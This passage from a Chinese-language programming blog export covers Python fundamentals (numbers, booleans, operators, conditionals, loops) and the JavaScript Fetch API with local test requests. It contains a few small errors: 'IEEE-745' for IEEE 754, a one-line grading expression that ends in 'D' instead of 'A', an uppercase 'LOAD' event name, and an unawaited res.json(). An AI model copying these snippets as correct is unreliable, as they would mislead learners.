<li>具體編碼：  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = random.getstate()</span><br><span class="line">random.randint(<span class="number">1</span>, <span class="number">10</span>)   <span class="comment"># 2</span></span><br><span class="line">random.randint(<span class="number">1</span>, <span class="number">10</span>)   <span class="comment"># 3</span></span><br><span class="line">random.randint(<span class="number">1</span>, <span class="number">10</span>)   <span class="comment"># 4</span></span><br><span class="line">random.randint(<span class="number">1</span>, <span class="number">10</span>)   <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line">random.setstate(x)</span><br><span class="line">random.randint(<span class="number">1</span>, <span class="number">10</span>)   <span class="comment"># 2</span></span><br><span class="line">random.randint(<span class="number">1</span>, <span class="number">10</span>)   <span class="comment"># 3</span></span><br><span class="line">random.randint(<span class="number">1</span>, <span class="number">10</span>)   <span class="comment"># 4</span></span><br><span class="line">random.randint(<span class="number">1</span>, <span class="number">10</span>)   <span class="comment"># 10</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="數字類型-Number"><a href="#數字類型-Number" class="headerlink" title="數字類型 Number"></a>數字類型 Number</h2><ol>
<li><p>整數型：</p>
<ul>
<li>python int類型沒有大小限制</li>
</ul>
</li>
<li><p>浮點型：</p>
<ul>
<li>基於IEEE-745算法，因此會出現誤差  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">0.1</span> + <span class="number">0.2</span>)    <span class="comment"># 0.30000000000000004</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>decimal module 精確計算：</p>
<ul>
<li>使用<code>decimal.Decimal(&#39;x&#39;)</code>聲明  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = decimal.Decimal(<span class="string">&#x27;0.1&#x27;</span>)</span><br><span class="line">b = decimal.Decimal(<span class="string">&#x27;0.2&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a + b)    <span class="comment"># 0.3</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>科學計數法：</p>
<ul>
<li>python會使用科學計算法來儲存小數點數字  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">0.00005</span>)  <span class="comment"># 5e-05</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>複數 Complex Number：</p>
<ul>
<li>以浮點型儲存  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="number">1</span> + <span class="number">2j</span></span><br><span class="line">x.real  <span class="comment"># 1.0</span></span><br><span class="line">x.imag  <span class="comment"># 2.0</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Calculation</p>
<table>
<thead>
<tr>
<th align="center">Operations</th>
<th align="center">Descriptions</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>x + y</code></td>
<td align="center">Addition</td>
</tr>
<tr>
<td align="center"><code>x - y</code></td>
<td align="center">Subtraction</td>
</tr>
<tr>
<td align="center"><code>x * y</code></td>
<td align="center">Multiplication</td>
</tr>
<tr>
<td align="center"><code>x / y</code></td>
<td align="center">Division</td>
</tr>
<tr>
<td align="center"><code>x // y</code></td>
<td align="center">Quotient</td>
</tr>
<tr>
<td align="center"><code>x % y</code></td>
<td align="center">Remainder</td>
</tr>
<tr>
<td align="center"><code>-x</code></td>
<td align="center">x reverses</td>
</tr>
<tr>
<td align="center"><code>+x</code></td>
<td align="center">x itself</td>
</tr>
<tr>
<td align="center"><code>abs(x)</code></td>
<td align="center">Absolute value</td>
</tr>
<tr>
<td align="center"><code>int(x)</code></td>
<td align="center">Turn x into an integer</td>
</tr>
<tr>
<td align="center"><code>float(x)</code></td>
<td align="center">Turn x into a float</td>
</tr>
<tr>
<td align="center"><code>complex(re, im)</code></td>
<td align="center">Return a complex number</td>
</tr>
<tr>
<td align="center"><code>x.conjugate()</code></td>
<td align="center">x’s conjugate</td>
</tr>
<tr>
<td align="center"><code>divmod(x, y)</code></td>
<td align="center">Return (Quotient, Remainder)</td>
</tr>
<tr>
<td align="center"><code>pow(x, y)</code></td>
<td align="center">x ^ y</td>
</tr>
<tr>
<td align="center"><code>x ** y</code></td>
<td align="center">x ^ y</td>
</tr>
</tbody></table>
</li>
</ol>
<h2 id="布爾值-Boolean"><a href="#布爾值-Boolean" class="headerlink" title="布爾值 Boolean"></a>布爾值 Boolean</h2><ol>
<li><p><code>False</code>的情況：</p>
<ol>
<li>定義為<code>False</code>的對象：<code>None</code>, <code>False</code></li>
<li>數值為0的數字類型：<code>0</code>, <code>0.0</code>, <code>0j</code>, <code>Decimal(0)</code>, <code>Fraction(0, 1)</code></li>
<li>空的序列和集合：<code>&quot;&quot;</code>, <code>()</code>, <code>[]</code>, <code>&#123;&#125;</code>, <code>set()</code>, <code>range(0)</code></li>
</ol>
<ul>
<li>具體編碼：  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">bool</span>(<span class="number">123</span>)   <span class="comment"># True</span></span><br><span class="line"><span class="built_in">bool</span>(<span class="string">&#x27; &#x27;</span>)   <span class="comment"># True</span></span><br><span class="line"><span class="built_in">bool</span>(<span class="string">&#x27;&#x27;</span>)    <span class="comment"># False</span></span><br><span class="line"><span class="built_in">bool</span>(<span class="number">0</span>)     <span class="comment"># False</span></span><br><span class="line"><span class="built_in">bool</span>(<span class="literal">False</span>) <span class="comment"># False</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>邏輯運算符：</p>
<ul>
<li><code>and</code>, <code>or</code>, <code>not</code>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span> &lt; <span class="number">4</span> <span class="keyword">and</span> <span class="number">4</span> &lt; <span class="number">5</span>     <span class="comment"># True</span></span><br><span class="line"><span class="number">3</span> &lt; <span class="number">4</span> <span class="keyword">or</span> <span class="number">6</span> &lt; <span class="number">5</span>      <span class="comment"># True</span></span><br><span class="line"><span class="keyword">not</span> <span class="number">3</span> &lt; <span class="number">4</span>           <span class="comment"># False</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>短路求值 Short-Circuit Evaluation：</p>
<ul>
<li>從左往右，只當第一個操作數的值無法確定邏輯運算結果時，才對第二個操作數進行求值  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span> <span class="keyword">and</span> <span class="number">4</span>     <span class="comment"># 4</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">or</span> <span class="number">4</span>      <span class="comment"># 3</span></span><br><span class="line">(<span class="keyword">not</span> <span class="number">1</span>) <span class="keyword">or</span> (<span class="number">1</span> <span class="keyword">and</span> <span class="number">0</span>) <span class="keyword">or</span> (<span class="number">3</span> <span class="keyword">and</span> <span class="number">4</span>) <span class="keyword">or</span> (<span class="number">5</span> <span class="keyword">and</span> <span class="number">6</span>) <span class="keyword">or</span> (<span class="number">7</span> <span class="keyword">and</span> <span class="number">8</span> <span class="keyword">and</span> <span class="number">9</span>)   <span class="comment"># False or 0 or 4 or 6 or 9 == 4</span></span><br><span class="line"><span class="keyword">not</span> <span class="number">1</span> <span class="keyword">or</span> <span class="number">0</span> <span class="keyword">and</span> <span class="number">1</span> <span class="keyword">or</span> <span class="number">3</span> <span class="keyword">and</span> <span class="number">4</span> <span class="keyword">or</span> <span class="number">5</span> <span class="keyword">and</span> <span class="number">6</span> <span class="keyword">or</span> <span class="number">7</span> <span class="keyword">and</span> <span class="number">8</span> <span class="keyword">and</span> <span class="number">9</span>     <span class="comment"># False or 0 or 4 or 6 or 9 == 4</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>運算符優先級 Precedence of Operators：</p>
<table>
<thead>
<tr>
<th align="center">Operator</th>
<th align="center">Meaning</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>()</code></td>
<td align="center">Parentheses</td>
</tr>
<tr>
<td align="center"><code>**</code></td>
<td align="center">Exponent</td>
</tr>
<tr>
<td align="center"><code>+x</code>, <code>-x</code>, <code>~x</code></td>
<td align="center">Unary plus, Unary minus, Bitwise NOT</td>
</tr>
<tr>
<td align="center"><code>*</code>, <code>/</code>, <code>//</code>, <code>%</code></td>
<td align="center">Multiplication, Division, Floor division, Modulus</td>
</tr>
<tr>
<td align="center"><code>+</code>, <code>-</code></td>
<td align="center">Addition, Subtraction</td>
</tr>
<tr>
<td align="center"><code>&lt;&lt;</code>, <code>&gt;&gt;</code></td>
<td align="center">Bitwise shift operators</td>
</tr>
<tr>
<td align="center"><code>&amp;</code></td>
<td align="center">Bitwise AND</td>
</tr>
<tr>
<td align="center"><code>^</code></td>
<td align="center">Bitwise XOR</td>
</tr>
<tr>
<td align="center"><code>|</code></td>
<td align="center">Bitwise OR</td>
</tr>
<tr>
<td align="center"><code>==</code>, <code>!=</code>, <code>&gt;</code>, <code>&gt;=</code>, <code>&lt;</code>, <code>&lt;=</code>, <code>is</code>, <code>is not</code>, <code>in</code>, <code>not in</code></td>
<td align="center">Comparisons, Identity, Membership operators</td>
</tr>
<tr>
<td align="center"><code>not</code></td>
<td align="center">Logical NOT</td>
</tr>
<tr>
<td align="center"><code>and</code></td>
<td align="center">Logical AND</td>
</tr>
<tr>
<td align="center"><code>or</code></td>
<td align="center">Logical OR</td>
</tr>
</tbody></table>
</li>
</ol>
<h2 id="條件語句"><a href="#條件語句" class="headerlink" title="條件語句"></a>條件語句</h2><ol>
<li><p>比較運算符：</p>
<table>
<thead>
<tr>
<th align="center">Symbol</th>
<th align="center">Meaning</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&lt;</td>
<td align="center">smaller than</td>
</tr>
<tr>
<td align="center">&lt;&#x3D;</td>
<td align="center">smaller than or equal to</td>
</tr>
<tr>
<td align="center">&gt;</td>
<td align="center">greater than</td>
</tr>
<tr>
<td align="center">&gt;&#x3D;</td>
<td align="center">greater than or equal to</td>
</tr>
<tr>
<td align="center">&#x3D;&#x3D;</td>
<td align="center">equal to</td>
</tr>
<tr>
<td align="center">!&#x3D;</td>
<td align="center">not equal</td>
</tr>
<tr>
<td align="center">is</td>
<td align="center">Objects’ id are equal</td>
</tr>
<tr>
<td align="center">is not</td>
<td align="center">Objects’ id are not equal</td>
</tr>
</tbody></table>
</li>
<li><p><code>if-else</code>語句：</p>
<ul>
<li>使用縮進調整執行的語句  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> x &lt; <span class="number">8</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;smaller than 8&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> x == <span class="number">8</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;equal to 8&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;greater than 8&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>if-else</code>表達式：</p>
<ul>
<li>將<code>if-else</code>語句縮減成一行的表達式  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># if-else 語句</span></span><br><span class="line"><span class="keyword">if</span> <span class="number">0</span> &lt;= score &lt; <span class="number">60</span>:</span><br><span class="line">    level = <span class="string">&#x27;D&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> <span class="number">60</span> &lt;= score &lt; <span class="number">80</span>:</span><br><span class="line">    level = <span class="string">&#x27;C&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> <span class="number">80</span> &lt;= score &lt; <span class="number">90</span>:</span><br><span class="line">    level = <span class="string">&#x27;B&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    level = <span class="string">&#x27;A&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if-else 表達式</span></span><br><span class="line">level = (<span class="string">&#x27;D&#x27;</span> <span class="keyword">if</span> <span class="number">0</span> &lt;= score &lt; <span class="number">60</span> <span class="keyword">else</span></span><br><span class="line">        <span class="string">&#x27;C&#x27;</span> <span class="keyword">if</span> <span class="number">60</span> &lt;= score &lt; <span class="number">80</span> <span class="keyword">else</span></span><br><span class="line">        <span class="string">&#x27;B&#x27;</span> <span class="keyword">if</span> <span class="number">80</span> &lt;= score &lt; <span class="number">90</span> <span class="keyword">else</span></span><br><span class="line">        <span class="string">&#x27;D&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="循環結構"><a href="#循環結構" class="headerlink" title="循環結構"></a>循環結構</h2><h3 id="while循環"><a href="#while循環" class="headerlink" title="while循環"></a>while循環</h3><ol>
<li><p><code>while</code>循環語句：</p>
<ul>
<li>語法：<code>while condition:</code>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">count = <span class="number">10</span></span><br><span class="line"><span class="keyword">while</span> count &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(count)</span><br><span class="line">    count -= <span class="number">1</span></span><br></pre></td></tr></table></figure></li>
<li><code>break</code>語句：跳出此次循環</li>
<li><code>continue</code>語句：跳到下次循環</li>
</ul>
</li>
<li><p><code>while-else</code>循環語句：</p>
<ul>
<li>當不滿足<code>while</code>條件時執行<code>else</code>語句  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">count = <span class="number">10</span></span><br><span class="line"><span class="keyword">while</span> count &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(count)</span><br><span class="line">    count -= <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;count is not greater than 0&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li>由於<code>else</code>是位於<code>while</code>語句中，因此<code>break</code>跳出<code>while</code>循環並不會執行<code>else</code>語句</li>
</ul>
</li>
<li><p>循環嵌套 nested loop</p>
<ul>
<li><code>while</code>循環中嵌套第二組<code>while</code>循環  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">9</span>:</span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> j &lt;= i:</span><br><span class="line">        <span class="built_in">print</span>(j, <span class="string">&#x27; * &#x27;</span>, i, <span class="string">&#x27; = &#x27;</span>, i*j, end=<span class="string">&#x27;\t&#x27;</span>)    <span class="comment"># end 表示末尾字符</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure></li>
<li><code>break</code>和<code>continue</code>只能作用於一層循環體</li>
</ul>
</li>
</ol>
<h3 id="for循環"><a href="#for循環" class="headerlink" title="for循環"></a>for循環</h3><ol>
<li><p><code>for</code>循環語句：</p>
<ul>
<li>語法：<code>for variable in iterableObject</code></li>
<li>可迭代對象 Iterable Object： <code>String</code>, <code>Array</code>, <code>Object</code>, <code>range()</code></li>
</ul>
</li>
<li><p>遍歷字符串<code>String</code>：</p>
<ul>
<li><code>variable</code>表示字符串中每一個字符  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;Hello World&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for實現</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    <span class="built_in">print</span>(char, end = <span class="string">&#x27; &#x27;</span>)  <span class="comment"># H e l l o   W o r l d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># while實現</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(<span class="built_in">str</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>[i])</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>遍歷次數：</p>
<ul>
<li>使用<code>range(start, stop, step)</code>函數返回一個可迭代的對象  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定結束 stop</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="built_in">print</span>(i, end = <span class="string">&#x27; &#x27;</span>)     <span class="comment"># 0 1 2 3 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定開始於結束 start &amp; stop</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(i, end = <span class="string">&#x27; &#x27;</span>)     <span class="comment"># 5 6 7 8 9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定跨度 step</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="number">10</span>, <span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(i, end = <span class="string">&#x27; &#x27;</span>)     <span class="comment"># 5 7 9</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>實用效果：</p>
<ul>
<li>遍歷所有質數  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, n):</span><br><span class="line">        <span class="comment"># 如果其中有可被整除則不是質數，跳出循環</span></span><br><span class="line">        <span class="keyword">if</span> n % x == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(n, end = <span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Fetch</title>
    <url>/myBlog/2022/08/03/2022/2022-8-3-Fetch/</url>
    <content><![CDATA[<h2 id="fetch基本認知"><a href="#fetch基本認知" class="headerlink" title="fetch基本認知"></a>fetch基本認知</h2><ol>
<li><p>發送請求方法：</p>
<ol>
<li><p>通過<code>Ajax</code>向服務器請求數據，使用<code>XMLHttpRequest</code>對象實現</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>()</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">xhr.<span class="title function_">send</span>()</span><br><span class="line">xhr.<span class="title function_">addEventListener</span>(<span class="string">&#x27;LOAD&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>(xhr.<span class="property">response</span>))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>通過<code>axios</code>實現，代碼精簡但底層仍然基於<code>XMLHttpRequest</code>對象實現，本質只是進行<code>Promise</code>封裝</p>
</li>
</ol>
</li>
<li><p><code>fetch</code>簡介：</p>
<ul>
<li>被稱為下一代的<code>Ajax</code>技術，內部採用<code>Promise</code>方法處理數據 （可以直接使用<code>.then</code>）</li>
<li>API語法簡潔</li>
<li>採用模塊化設計，API分散於多個對象中 （<code>Responnse</code>對象、<code>Request</code>對象、<code>Header</code>對象）</li>
<li>通過數據流 （<code>Stream</code>對象）處理數據，可以分塊讀取，有利於提高網站性能</li>
</ul>
</li>
</ol>
<h2 id="GET請求"><a href="#GET請求" class="headerlink" title="GET請求"></a>GET請求</h2><ol>
<li><p>簡介：</p>
<ul>
<li>如果<code>fetch()</code>只接收<font color="#f54747">一個</font><code>url</code>字符串參數，表示默認向網址發送<code>GET</code>請求，會返回一個<code>Promise</code>對象</li>
</ul>
</li>
<li><p>基本使用</p>
<ul>
<li>具體編碼  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://127.0.0.1:8080/test_fetch_get&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 直接得到的 res 是一個 Response 對象</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// res.json() 是一個異步操作，表示取出所有內容，並轉換成 JSON 對象</span></span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>()</span><br><span class="line"></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">json</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 獲取處理過的數據</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(json)</span><br><span class="line"></span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 捕獲錯誤信息</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>把代碼封裝成<code>async</code>異步函數</p>
<ul>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getData</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// 通過 try...catch 處理 async 和 await 成功和失敗情</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 先獲取 Response 對象</span></span><br><span class="line">        <span class="keyword">let</span> res = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;http://127.0.0.1:8080/test_fetch_get&#x27;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通過 res.json() 取出 Response 對象中的結果</span></span><br><span class="line">        <span class="keyword">let</span> json = <span class="keyword">await</span> res.<span class="title function_">json</span>()</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(json)</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">getData</span>()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="Respons對象"><a href="#Respons對象" class="headerlink" title="Respons對象"></a>Respons對象</h2><ol>
<li><p>常見屬性：</p>
<table>
<thead>
<tr>
<th align="center">屬性</th>
<th align="center">含義</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>res.ok</code></td>
<td align="center">返回<code>boolean</code>，表示請求是否成功</td>
</tr>
<tr>
<td align="center"><code>res.status</code></td>
<td align="center">返回數字，表示<code>HTTP</code>響應的狀態碼（例如：200表示請求成功）</td>
</tr>
<tr>
<td align="center"><code>res.statusText</code></td>
<td align="center">返回狀態的文本信息</td>
</tr>
<tr>
<td align="center"><code>res.url</code></td>
<td align="center">返回請求的<code>url</code>地址值</td>
</tr>
</tbody></table>
</li>
<li><p>常見方法：</p>
<table>
<thead>
<tr>
<th align="center">方法</th>
<th align="center">含義</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>res.json()</code></td>
<td align="center">得到 JSON 對象</td>
</tr>
<tr>
<td align="center"><code>res.text()</code></td>
<td align="center">得到文本字符串</td>
</tr>
<tr>
<td align="center"><code>res.blob()</code></td>
<td align="center">得到二進制 Blob 對象</td>
</tr>
<tr>
<td align="center"><code>res.formData()</code></td>
<td align="center">得到 FormData 表單對象</td>
</tr>
<tr>
<td align="center"><code>res.arrayBuffer()</code></td>
<td align="center">得到二進制 ArrayBuffer 對象</td>
</tr>
</tbody></table>
</li>
</ol>
<h2 id="POST請求"><a href="#POST請求" class="headerlink" title="POST請求"></a>POST請求</h2><ol>
<li><p>簡介：</p>
<ul>
<li><code>fetch()</code>可以傳遞第二個參數指定請求的方式</li>
<li>配置參數：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;url&#x27;</span>, &#123;</span><br><span class="line">    <span class="comment">// 請求方法</span></span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="comment">// 設置請求頭</span></span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="comment">// 數據格式</span></span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 配置請求體數據</span></span><br><span class="line">    <span class="attr">body</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>JSON格式：</p>
<ul>
<li>設置請求頭：<code>&#39;Content-Type&#39;: &#39;application/json&#39;</code></li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">add</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> obj = &#123;<span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>, <span class="attr">age</span>:<span class="number">18</span>, <span class="attr">gender</span>: <span class="string">&#x27;M&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> res = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;http://127.0.0.1:8080/test_fetch_post&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="title function_">json</span>())</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">add</span>()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>urlencoded</code>格式：</p>
<ul>
<li>設置請求頭：<code>&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;</code></li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">add</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> res = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;http://127.0.0.1:8080/test_fetch_post&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">body</span>: <span class="string">&#x27;name=Donald&amp;age=18&amp;gender=M&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="title function_">json</span>())</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">add</span>()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="fetch函數封裝"><a href="#fetch函數封裝" class="headerlink" title="fetch函數封裝"></a>fetch函數封裝</h2><ol>
<li><p>簡介：</p>
<ul>
<li><code>fetch</code>相比<code>XMLHttpRequest</code>已經方便很多，但參數仍須自己處理<ul>
<li><code>GET</code>, <code>DELETE</code>的請求參數需要寫在地址欄裡</li>
<li><code>PUT</code>, <code>PATCH</code>, <code>POST</code>的請求參數需要轉JSON設置請求頭</li>
</ul>
</li>
</ul>
</li>
<li><p>二次封裝效果：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 發送GET、DELETE請求</span></span><br><span class="line"><span class="title function_">http</span>(&#123;</span><br><span class="line">    <span class="attr">method</span>:<span class="string">&#x27;XXX&#x27;</span>,</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&#x27;xxx&#x27;</span>,</span><br><span class="line">    <span class="attr">params</span>: &#123;...&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 發送POST、PUT、PATCH請求</span></span><br><span class="line"><span class="title function_">http</span>(&#123;</span><br><span class="line">    <span class="attr">method</span>:<span class="string">&#x27;XXX&#x27;</span>,</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&#x27;xxx&#x27;</span>,</span><br><span class="line">    <span class="attr">data</span>: &#123;...&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>具體編碼：</p>
